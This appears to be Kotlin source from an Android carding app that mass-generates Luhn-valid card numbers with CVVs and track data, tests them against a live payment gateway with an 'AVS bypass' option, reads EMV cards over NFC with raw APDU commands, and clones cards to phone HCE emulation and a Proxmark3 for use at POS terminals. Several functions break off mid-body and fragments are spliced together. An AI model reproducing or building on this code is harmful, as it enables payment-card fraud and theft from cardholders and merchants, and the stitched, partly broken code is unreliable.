    // ==================== CARD GENERATION ENGINE ====================
    private fun startMassGeneration() {
        isGenerating = true
        generateBtn.text = "STOP GENERATION"
        generateBtn.setBackgroundColor(0xFFFF4444.toInt())
        
        generationCount.set(0)
        validCount.set(0)
        
        generationThread = Thread {
            var generated = 0
            var valid = 0
            val startTime = System.currentTimeMillis()
            
            while (isGenerating && generated < MAX_GENERATION) {
                try {
                    // Generate batch of cards
                    val batch = cardGenerator.generateBatch(10)
                    
                    runOnUiThread {
                        for (card in batch) {
                            if (card.valid) {
                                cardDatabase.add(card)
                                workingCards[card.number] = card
                                valid++
                                
                                // Update UI if live gen enabled
                                if (liveGenToggle.isChecked && generated % 10 == 0) {
                                    displayCardDetails(card)
                                }
                            }
                            generated++
                        }
                        
                        // Update counters
                        generationCount.set(generated)
                        validCount.set(valid)
                        
                        // Update stats
                        updateStats()
                        
                        // Auto-save every 100 cards
                        if (generated % 100 == 0) {
                            saveDatabase()
                        }
                    }
                    
                    // Log progress
                    if (generated % 50 == 0) {
                        val rate = generated / ((System.currentTimeMillis() - startTime) / 1000.0)
                        logMessage("Generated: $generated | Valid: $valid | Rate: ${"%.1f".format(rate)}/sec")
                    }
                    
                    // AI analysis if enabled
                    if (aiAnalysisToggle.isChecked && generated %   200 == 0) {
                        aiEngine.analyzeBatch(batch)
                    }
                    
                    Thread.sleep(10) // Prevent UI freeze
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Generation error: ${e.message}")
                }
            }
            
            val totalTime = (System.currentTimeMillis() - startTime) / 1000.0
            val successRate = if (generated > 0) (valid.toDouble() / generated * 100) else 0.0
            
            runOnUiThread {
                generateBtn.text = "GENERATE CARDS"
                generateBtn.setBackgroundColor(0xFF4CAF50.toInt())
                isGenerating = false
                
                logMessage("=== GENERATION COMPLETE ===")
                logMessage("Total generated: $generated")
                logMessage("Valid cards: $valid (${"%.1f".format(successRate)}%)")
                logMessage("Time: ${"%.1f".format(totalTime)} seconds")
                logMessage("Rate: ${"%.1f".format(generated/totalTime)} cards/sec")
                
                cardsAdapter.notifyDataSetChanged()
                
                // Auto-upload to cloud if enabled
                if (valid > 0) {
                    cloudEngine.uploadBatch(batch)
                }
            }
        }
        
        generationThread?.start()
    }
    
    private fun stopMassGeneration() {
        isGenerating = false
        generationThread?.interrupt()
    }

    // ==================== VALIDATION ENGINE ====================
    private fun validateCurrentCard() {
        val card = currentCard ?: run {
            toast("No card to validate")
            return
        }
        
        GlobalScope.launch(Dispatchers.IO) {
            // Step 1: Luhn check
            val luhnValid = validator.checkLuhn(card.number)
            
            // Step 2: BIN validation
            val binInfo = binEngine.lookup(card.bin)
            
            // Step 3: Expiry check
            val expiryValid = validator.checkExpiry(card.expiry)
            
            // Step 4: CVV format check
            val cvvValid = validator.checkCVV(card.cvv, card.type)
            
            // Step 5: Live API check (if enabled)
            var liveValid = false
            var gatewayResponse = ""
            
            if (bypassAvsToggle.isChecked) {
                liveValid = paymentGateway.testCard(card)
                gatewayResponse = paymentGateway.lastResponse
            }
            
            // Compile results
            val results = ValidationResult(
                luhnValid = luhnValid,
                binValid = binInfo != null,
                expiryValid = expiryValid,
                cvvValid = cvvValid,
                liveValid = liveValid,
                binInfo = binInfo,
                gatewayResponse = gatewayResponse,
                score = calculateValidationScore(luhnValid, binInfo != null, expiryValid, cvvValid, liveValid)
            )
            
            withContext(Dispatchers.Main) {
                displayValidationResults(results)
                
                if (results.score >= 80) {
                    card.valid = true
                    card.lastValidated = System.currentTimeMillis()
                    card.validationScore = results.score
                    
                    // Add to working database
                    workingCards[card.number] = card
                    
                    // AI learning
                    aiEngine.learnFromValidCard(card)
                    
                    logMessage("VALIDATION PASSED - Score: ${results.score}/100")
                    statusText.text = "VALID - ${results.score}/100"
                    statusText.setTextColor(0xFF00FF00.toInt())
                    
                    // Auto-clone if enabled
                    if (autoCloneToggle.isChecked) {
                        cloneCardToHCE(card)
                    }
                } else {
                    logMessage("VALIDATION FAILED - Score: ${results.score}/100")
                    statusText.text = "INVALID - ${results.score}/100"
                    statusText.setTextColor(0xFFFF0000.toInt())
                }
                
                // Update database
                cardsAdapter.notifyDataSetChanged()
                saveDatabase()
            }
        }
    }

    private fun handleNFCIntent(intent: Intent) {
        if (!isScanning) return
        
        when (intent.action) {
            NfcAdapter.ACTION_TECH_DISCOVERED,
            NfcAdapter.ACTION_TAG_DISCOVERED -> {
                val tag = intent.getParcelableExtra<Tag>(NfcAdapter.EXTRA_TAG)
                tag?.let { processNFCTag(it) }
            }
        }
    }
    
    private fun processNFCTag(tag: Tag) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val tagId = bytesToHex(tag.id)
                logMessage("TAG CAPTURED: $tagId")
                
                // Determine tag type
                val techList = tag.techList.joinToString(", ")
                
                // Try EMV card (ISO-DEP)
                if (techList.contains(IsoDep::class.java.name)) {
                    val cardData = readEMVCard(tag)
                    cardData?.let { processEMVData(it) }
                }
                
                // Try MIFARE Classic
                if (techList.contains(MifareClassic::class.java.name)) {
                    val mifareData = readMifareClassic(tag)
                    mifareData?.let { processMifareData(it) }
                }
                
                // Try NFC-A (PayWave, PayPass)
                if (techList.contains(NfcA::class.java.name)) {
                    val nfcAData = readNfcA(tag)
                    nfcAData?.let { processNfcAData(it) }
                }
                
                // Update UI
                withContext(Dispatchers.Main) {
                    updateStats()
                    cardsAdapter.notifyDataSetChanged()
                }
                
            } catch (e: Exception) {
                logMessage("Tag processing error: ${e.message}")
            }
        }
    }
    
    private fun readEMVCard(tag: Tag): EMVData? {
        return try {
            val isoDep = IsoDep.get(tag)
            isoDep.connect()
            isoDep.timeout = 10000
            
            // SELECT PPSE
            val ppseCommand = byteArrayOf(
                0x00.toByte(), 0xA4.toByte(), 0x04.toByte(), 0x00.toByte(),
                0x0E.toByte(), 0x32.toByte(), 0x50.toByte(), 0x41.toByte(),
                0x59.toByte(), 0x2E.toByte(), 0x53.toByte(), 0x59.toByte(),
                0x53.toByte(), 0x2E.toByte(), 0x44.toByte(), 0x44.toByte(),
                0x46.toByte(), 0x30.toByte(), 0x31.toByte(), 0x00.toByte()
            )
            
            val ppseResponse = isoDep.transceive(ppseCommand)
            
            // Parse AIDs and select payment application
            // This is simplified - real implementation would parse response
            
            // GET PROCESSING OPTIONS
            val gpoCommand = byteArrayOf(
                0x80.toByte(), 0xA8.toByte(), 0x00.toByte(), 0x00.toByte(),
                0x02.toByte(), 0x83.toByte(), 0x00.toByte(), 0x00.toByte()
            )
            
            val gpoResponse = isoDep.transceive(gpoCommand)
            
            // READ RECORDS
            val records = mutableListOf<ByteArray>()
            for (sfi in 1..31) {
                for (record in 1..16) {
                    val readCommand = byteArrayOf(
                        0x00.toByte(), 0xB2.toByte(), record.toByte(), 
                        ((sfi shl 3) or 4).toByte(), 0x00.toByte()
                    )
                    
                    try {
                        val response = isoDep.transceive(readCommand)
                        if (response.size > 2) {
                            records.add(response)
                        }
                    } catch (e: Exception) {
                        break
                    }
                }
            }
            
            isoDep.close()
            
            EMVData(
                tagId = bytesToHex(tag.id),
                ppseData = bytesToHex(ppseResponse),
                gpoData = bytesToHex(gpoResponse),
                records = records.map { bytesToHex(it) },
                ats = isoDep.historicalBytes?.let { bytesToHex(it) } ?: ""
            )
            
        } catch (e: Exception) {
            logMessage("EMV read error: ${e.message}")
            null
        }
    }

    private fun cloneCardToHCE(card: CardData) {
        logMessage("=== HCE CLONING ===")
        
        // Configure HCE service
        val hceService = Intent(this, HCEService::class.java)
        
        // Prepare AID list for this card type
        val aids = when (card.type) {
            "VISA" -> listOf("A0000000031010", "A0000000032010")
            "MASTERCARD" -> listOf("A0000000041010", "A0000000043060")
            "AMEX" -> listOf("A00000002501", "A0000000250100")
            "DISCOVER" -> listOf("A0000003241010", "A0000001523010")
            else -> listOf("A0000000031010") // Default Visa
        }
        
        // Prepare card data
        val cardData = Bundle().apply {
            putString("NUMBER", card.number)
            putString("EXPIRY", card.expiry)
            putString("CVV", card.cvv)
            putString("NAME", card.name)
            putString("TRACK1", card.track1)
            putString("TRACK2", card.track2)
            putStringArrayList("AIDS", ArrayList(aids))
            putString("TYPE", card.type)
        }
        
        hceService.putExtras(cardData)
        
        // Start HCE service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(hceService)
        } else {
            startService(hceService)
        }
        
        // Configure as default payment app
        val nfcAdapter = NfcAdapter.getDefaultAdapter(this)
        val paymentApps = nfcAdapter.getNfcAdapterExtras().cardEmulation?.paymentServices
        paymentApps?.let {
            val component = ComponentName(this, HCEService::class.java)
            it.setPreferredService(component)
        }
        
        logMessage("HCE Active - Phone now emulates: ${maskCardNumber(card.number)}")
        logMessage("AIDs registered: ${aids.joinToString(", ")}")
        logMessage("Present phone to POS terminal")
        
        statusText.text = "EMULATING: ${card.type} ${maskCardNumber(card.number)}"
        statusText.setTextColor(0xFFFFFF00.toInt())
        
        isEmulating = true
        emulateBtn.text = "STOP EMULATION"
        emulateBtn.setBackgroundColor(0xFFFF4444.toInt())
    }
    
    private fun cloneCardToProxmark(card: CardData) {
        logMessage("=== PROXMARK3 CLONING ===")
        
        GlobalScope.launch(Dispatchers.IO) {
            try {
                // Connect to Proxmark3
                val connection = connectToProxmark3()
                
                if (connection != null) {
                    // Send clone commands
                    connection.send("hf 14a sim --1k\n")
                    delay(100)
                    
                    // Set UID
                    connection.send("hf mf csetuid --uid ${card.number.substring(0, 8)}\n")
                    delay(100)
                    
                    // Write track data
                    val track1Hex = stringToHex(card.track1)
                    val track2Hex = stringToHex(card.track2)
                    
                    connection.send("hf mf wrbl --blk 0 --data $track1Hex\n")
                    delay(50)
                    connection.send("hf mf wrbl --blk 1 --data $track2Hex\n")
                    
                    // Verify
                    connection.send("hf mf dump\n")
                    
                    val response = connection.receive(5000)
                    
                    withContext(Dispatchers.Main) {
                        logMessage("Proxmark3 Response: $response")
                        
                        if (response.contains("OK") || response.contains("done")) {
                            logMessage("SUCCESS: Card written to Proxmark3")

    private fun luhnGenerate(number: String): String {
        // Implementation of Luhn algorithm
        val digits = number.map { it.toString().toInt() }.toMutableList()
        var sum = 0
        var alternate = false
        
        for (i in digits.size - 1 downTo 0) {
            var n = digits[i]
            if (alternate) {
                n *= 2
                if (n > 9) n = n - 9
            }
            sum += n
            alternate = !alternate
        }
        
        val checkDigit = (10 - (sum % 10)) % 10
        return number + checkDigit.toString()
    }
    
    private fun luhnCheck(number: String): Boolean {
        val digits = number.map { it.toString().toInt() }
        var sum = 0
        var alternate = false
        
        for (i in digits.size - 1 downTo 0) {
            var n = digits[i]
            if (alternate) {
                n *= 2
                if (n > 9) n = n - 9
            }
            sum += n
            alternate = !alternate
        }
        
        return sum % 10 == 0
    }

    private fun calculateLRC(data: String): String {

        var lrc: Byte = 0

    private val binList = loadBINList()
    
    fun generateBatch(size: Int): List<CardData> {
        return (1..size).map { generateSingle() }
    }
    
    fun generateSingle(): CardData {
        val bin = binList.random()
        
        // Generate card number with Luhn
        val middle = String.format("%09d", random.nextInt(1000000000))
        val base = bin + middle
        val cardNumber = luhnGenerate(base)
        
        // Expiry (1-5 years future)
        val calendar = Calendar.getInstance()
        calendar.add(Calendar.MONTH, 12 + random.nextInt(48))
        val month = String.format("%02d", 1 + random.nextInt(12))
        val year = (calendar.get(Calendar.YEAR) % 100).toString()
        val expiry = "$month/$year"
        
        // CVV
        val cvv = String.format("%03d", random.nextInt(1000))
        
        // Name
        val names = arrayOf("JOHN DOE", "JANE SMITH", "ROBERT JOHNSON", "MICHAEL BROWN")
        val name = names.random()
        
        // Generate track data
        val track1 = "B$cardNumber^$name^$expiry"
        val track2 = ";$cardNumber=$expiry=$cvv?"
        
        return CardData(
            number = cardNumber,
            expiry = expiry,
            cvv = cvv,
            name = name,
            bin = bin,
            track1 = track1,
            track2 = track2,
            bank = getBankName(bin),
            type = getCardType(bin),
            country = getCountry(bin),
            valid = false,
            balance = (100 + random.nextInt(9900)).toDouble(),

class CardsAdapter(
    private val cards: List<CardData>,
    private val onItemClick: (CardData) -> Unit
) : RecyclerView.Adapter<CardsAdapter.ViewHolder>() {
    
    class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
        val numberText: TextView = view.findViewById(R.id.cardItemNumber)
        val expiryText: TextView = view.findViewById(R.id.cardItemExpiry)
        val bankText: TextView = view.findViewById(R.id.cardItemBank)
        val statusIndicator: View = view.findViewById(R.id.cardItemStatus)
    }
    
    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
        val view = LayoutInflater.from(parent.context)
            .inflate(R.layout.item_card, parent, false)
        return ViewHolder(view)
    }
    
    override fun onBindViewHolder(holder: ViewHolder, position: Int) {
        val card = cards[position]
        
        holder.numberText.text = maskCardNumber(card.number)
        holder.expiryText.text = card.expiry
        holder.bankText.text = "${card.bank} (${card.type})"
        
        // Status indicator
        when {
            card.liveTested -> holder.statusIndicator.setBackgroundColor(0xFF00FF00.toInt())
            card.valid -> holder.statusIndicator.setBackgroundColor(0xFFFFFF00.toInt())
            else -> holder.statusIndicator.setBackgroundColor(0xFFFF0000.toInt())
        }
        
        holder.itemView.setOnClickListener {
            onItemClick(card)
        }
    }
    
    override fun getItemCount(): Int = cards.size
    
    private fun maskCardNumber(number: String): String {
        return if (number.length >= 16) {
            "**** **** **** ${number.takeLast(4)}"
        } else {
            number
        }
    }
}
